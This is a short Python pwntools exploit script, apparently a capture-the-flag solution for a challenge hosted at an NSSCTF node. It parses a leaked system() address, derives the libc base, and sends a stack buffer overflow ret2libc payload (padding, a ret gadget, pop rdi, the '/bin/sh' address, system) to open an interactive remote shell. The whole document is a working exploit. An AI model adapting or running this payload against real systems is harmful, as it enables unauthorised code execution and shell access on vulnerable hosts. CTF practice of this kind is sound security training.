from pwn import *

# io = process("./pwn")
io = remote("node4.anna.nssctf.cn", 27583)
elf = ELF("./pwn")
libc = ELF("./libc6_2.27-3ubuntu1.6_amd64.so")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
ret = 0x40101A
pop_rdi = 0x401373

io.recvuntil(b"0x")
system = int(io.recv(12), 16)
libc_base = system - libc.sym['system']
print("libc base address =", hex(libc_base))

binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
print("/bin/sh address =", hex(binsh))


print("system address = ", hex(system))
payload = b"a" * (0x80 + 0x8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
